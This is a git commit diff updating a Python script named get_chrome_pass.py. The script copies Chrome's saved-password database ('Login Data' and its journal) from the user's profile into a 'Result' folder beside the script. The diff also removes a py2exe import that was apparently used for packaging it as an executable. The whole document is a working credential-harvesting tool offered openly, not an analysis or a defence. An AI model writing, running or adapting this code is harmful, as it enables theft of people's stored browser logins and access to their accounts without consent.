10aad6ba9ee3dabb4a8a2a257108864637677783
martog <martin.holy.grigorov@gmail.com>
2017-01-15 00:50:01 +0200

    Update get_chrome_pass.py

--- Chr_get_pss/get_chrome_pass.py
+++ Chr_get_pss/get_chrome_pass.py
@@ -1,15 +1,21 @@
-import os, shutil, sys, getpass, py2exe
+import os, shutil, sys, getpass
 
 #it copies the chrome login data and login data-journal files to desktop
 def get_passwords():
+	#create directory
+	directory = os.path.dirname(os.path.realpath(__file__)) + "\Result"
+	if not os.path.exists(directory):
+		os.makedirs(directory)
+   
+
 	#copying Login Data file
 	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data"
-	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Login Data"
+	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data"
 	shutil.copyfile(data_path, final_path)
 
 	#copying Login Data-journal file
 	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data-journal"
-	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Login Data-journal"
+	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data-journal"
 	shutil.copyfile(data_path, final_path)
 	print("Passwords file copied successfully!")
 
